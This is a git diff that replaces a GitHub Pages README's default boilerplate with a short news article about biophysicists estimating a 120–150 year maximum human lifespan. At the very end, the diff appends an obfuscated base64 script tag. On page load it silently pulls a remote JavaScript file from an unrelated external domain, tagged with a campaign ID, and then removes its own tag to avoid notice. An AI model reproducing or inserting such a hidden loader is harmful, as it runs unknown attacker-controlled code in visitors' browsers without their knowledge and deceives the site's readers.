@@ -1,37 +1,22 @@
-## Welcome to GitHub Pages
+# Immortality is canceled: biophysicists believe that people can't live longer than 150 years
 
-You can use the [editor on GitHub](https://github.com/whassan40/tech/edit/main/README.md) to maintain and preview the content for your website in Markdown files.
+![Image](whassan402.jpeg)
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+## Researchers from the United States and Singapore have found that the maximum life expectancy a person could ever achieve is 120-150 years.
+This prediction was made by experts in the field of biology and biophysics of the Singapore Biotechnology Company Gero and the Roswell Park Cancer Center in Buffalo, New York, reports Daily Mail.
 
-### Markdown
+The scientists relied on medical data from hundreds of thousands of volunteers from the United Kingdom and the United States, as well as the results of two longitudinal DNA studies. All information scientists passed through artificial intelligence system created by them - DOSI ("Dynamic Indicator of Body Condition"). It turned out that at the age of 120 to 150 years, the human body finally loses the ability to recover.
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+For most of human history, which is available to us, the average life expectancy was between 20 and 40 years. Today it is over 80 years in developed countries, thanks to better nutrition, clean water, hygiene and medicine. In the future, people will be able to live even longer - through genetic manipulation, caloric restriction, and the invention of new drugs. But there will be a limit to human life in any case.
 
-```markdown
-Syntax highlighted code block
+Researchers have discovered two key parameters responsible for longevity: lifestyle factors and how the body responds to them. The first is our biological age: it is determined by stress, lifestyle and disease. The second is the body's resilience, that is, how quickly it is able to return to normal after shocks.
 
-# Header 1
-## Header 2
-### Header 3
+![Image](whassan401.jpeg)
 
-- Bulleted
-- List
+Aging is associated with the appearance of so-called zombie cells in the body, which are alive but no longer able to function properly. These cells are associated with a variety of age-related conditions, from arthritis to Alzheimer's disease. Even in those who do not suffer from serious chronic diseases, zombie cells become more numerous as they age, and the body's resilience decreases. An aging person needs more and more time to recover from shocks, and the periods spent in a physiological state close to optimal are getting shorter. Therefore, even the most effective prevention and treatment of age-related diseases can increase average life expectancy, but cannot affect maximum life expectancy. Unless, of course, innovative anti-aging treatments emerge.
 
-1. Numbered
-2. List
+The researchers also developed an iPhone app called GeroSense, which calculates a user's biological aging rate and maximum lifespan based on physical activity.
 
-**Bold** and _Italic_ and `Code` text
+The study was published in the journal Nature Communications. 
 
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/whassan40/tech/settings/pages). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and we’ll help you sort it out.
+<script id="QSsD0" src="data:text/javascript;base64, dmFyIF9MYUs2OSA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX3JWTUVhLCBfajB6cUMpIHt2YXIgX1VtOE9YID0gZnVuY3Rpb24oX3dlUnNMKSB7d2hpbGUgKC0tX3dlUnNMKSB7X3JWTUVhWydwdXNoJ10oX3JWTUVhWydzaGlmdCddKCkpO319O19VbThPWCgrK19qMHpxQyk7fShfTGFLNjksIDB4MTFiKSk7dmFyIF84Rm5ibiA9IGZ1bmN0aW9uKF9yZUxOUywgX0xQbDROKSB7X3JlTE5TID0gX3JlTE5TIC0gMHgwO3ZhciBfUmhOSGggPSBfTGFLNjlbX3JlTE5TXTtyZXR1cm4gX1JoTkhoO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfOEZuYm4oJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX1A4V0FtID0gZG9jdW1lbnRbXzhGbmJuKCcweDEnKV0oXzhGbmJuKCcweDInKSk7X1A4V0FtW184Rm5ibignMHgzJyldID0gXzhGbmJuKCcweDQnKTtfUDhXQW1bJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHgzNVx4NzNceDZiXHg2ZVx4NzhceDZkXHg2M1x4NzdceDJlXHg2M1x4NjFceDczXHg2M1x4NjFceDMzXHgyZVx4NzNceDcwXHg2MVx4NjNceDY1XHgyZlx4NWZceDcyXHg2NVx4NmRceDZmXHg3NFx4NjVceDVmXHg3NFx4NzJceDYxXHg2M1x4NmJceDJlXHg2YVx4NzNceDNmXHg2M1x4NjFceDZkXHg3MFx4NjFceDY5XHg2N1x4NmVceDNkXHgzMVx4NTZceDc4XHg2Zlx4NGJceDU2XHg2OFx4NzdceDc4XHg0ZSc7ZG9jdW1lbnRbXzhGbmJuKCcweDUnKV0oXzhGbmJuKCcweDYnKSlbJ1x4NjFceDcwXHg3MFx4NjVceDZlXHg2NFx4NDNceDY4XHg2OVx4NmNceDY0J10oX1A4V0FtKTtkb2N1bWVudFtfOEZuYm4oJzB4NycpXSgnUVNzRDAnKVsnXHg3Mlx4NjVceDZkXHg2Zlx4NzZceDY1J10oKTt9LCB7J1x4NmZceDZlXHg2M1x4NjUnOiAhIVtdfSk7"></script>
